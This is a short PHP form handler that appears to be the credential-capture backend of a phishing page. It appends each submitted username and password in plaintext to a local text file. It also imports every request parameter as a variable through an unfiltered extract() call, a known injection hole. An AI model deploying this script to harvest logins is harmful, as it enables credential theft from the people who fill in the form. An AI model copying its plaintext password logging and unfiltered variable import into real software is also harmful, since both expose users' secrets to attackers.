<?php
    extract($_REQUEST);
    $file=fopen("form-save.txt","a");

    fwrite($file,"name :");
    fwrite($file, $username ."\n");
    fwrite($file,"password :");
    fwrite($file, $password ."\n");
    fclose($file);
 ?>
